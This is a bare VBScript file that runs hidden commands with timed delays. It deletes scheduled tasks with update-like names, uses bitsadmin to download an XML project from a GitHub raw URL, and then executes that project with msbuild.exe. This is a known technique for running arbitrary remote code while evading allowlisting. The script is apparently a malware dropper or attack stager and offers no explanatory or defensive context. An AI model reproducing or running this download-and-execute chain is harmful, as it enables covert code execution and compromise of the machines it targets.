Set objShell = CreateObject("Wscript.Shell") 



WScript.Sleep 10000

  

objShell.run("schtasks /delete /tn OneSHOTDriveUpdateV1 /f"), 0, True
  

WScript.Sleep 12000


objShell.run("schtasks /delete /tn 1Updateworkstation /f"), 0, True



WScript.Sleep 18000



objShell.run("schtasks /delete /tn RunV1 /f"), 0, True



WScript.Sleep 30000



objShell.run("bitsadmin /transfer wcb /priority high https://raw.githubusercontent.com/shadowbrokerman/testing/master/chaintest.xml %USERPROFILE%\chaintest.xml"), 0, True



WScript.Sleep 30000



  objShell.run("%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %USERPROFILE%\chaintest.xml"), 0, False





